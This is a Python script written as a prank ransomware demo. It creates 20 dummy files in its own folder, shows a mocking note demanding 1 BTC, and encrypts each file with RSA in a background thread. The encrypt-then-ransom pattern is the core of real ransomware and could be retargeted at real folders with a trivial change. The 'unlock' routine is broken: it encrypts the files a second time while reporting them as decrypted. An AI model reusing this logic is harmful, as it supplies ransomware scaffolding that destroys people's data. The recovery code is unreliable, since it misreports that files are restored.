import os
import threading
from time import sleep
import msvcrt
from typing import Callable

import rsa
import colorama
from colorama import Fore

from utils import cli
from utils import key_manager


class EncrypterThread(threading.Thread):
    def __init__(self, dir_: str):
        super(EncrypterThread, self).__init__()
        self._stop = False
        self._dir = dir_

    def run(self):
        files_count: int = (len(os.listdir(self._dir)))
        for file_num, file in enumerate(os.listdir(self._dir)):

            if self._stop:
                print("Encrypshion was stoped")
                break

            sleep(1)
            with open(f"{self._dir}\\{file}", "rb") as f:
                data = rsa.encrypt(f.read(), public_key)

            with open(f"{self._dir}\\{file}", "wb") as f:
                f.write(data)

            print(
                f"File {file} was encruptad! Files left {files_count-file_num-1}/{files_count}"
            )

    def stop(self):
        self._stop = True


def main() -> None:
    print(f"{Fore.RED}*****************************\n"
          "Ur ass has been hacked >:D\n\n"
          "Pay 1 BTC to ma vallet or\n"
          "All ur files wil be encruptad\n"
          "*****************************\n\n"
          "Pres ma feyvorit leter for\n"
          "free unlok\n\n"
          "*****************************"
          )

    enc_thread = EncrypterThread(files_path)
    enc_thread.start()
    solved: bool = False

    while enc_thread.is_alive():
        if msvcrt.getch() == b"a":
            enc_thread.stop()
            solved = True
            break

    if solved:
        files_count: int = len(os.listdir(files_path))
        for file_num, file in enumerate(os.listdir(files_path)):

            with open(f"{files_path}\\{file}", "rb") as f:
                data = rsa.encrypt(f.read(), public_key)

            with open(f"{files_path}\\{file}", "wb") as f:
                f.write(data)

            print(
                f"File {file} was decruptad! Files left {files_count-file_num-1}/{files_count}"
            )


if __name__ == "__main__":
    colorama.init(autoreset=True)

    public_path: str = os.path.abspath("public.key")
    private_path: str = os.path.abspath("private.key")
    files_path: str = os.path.abspath("ur imoprtent files")

    clear: Callable[[], None] = lambda: print("\033[H\033[J", end="")

    print("Loading...")

    # Load keys
    if os.path.exists(private_path) and os.path.exists(public_path):
        try:
            public_key = key_manager.load_public_key(public_path)
            private_key = key_manager.load_private_key(private_path)

        except ValueError:
            public_key, private_key = rsa.newkeys(2048)

    # Create new keys
    else:
        public_key, private_key = rsa.newkeys(2048)

    # Save keys
    key_manager.save_key(public_key, "public.key")
    key_manager.save_key(private_key, "private.key")

    # Create directory with files
    if not os.path.exists(files_path):
        os.mkdir(files_path)

    for i in range(20):
        with open(f"{files_path}\\imoprtent_file_{i}", "w") as f:
            f.write("\n".join("som of ur importent info" for _ in range(5)))

    clear()
    main()
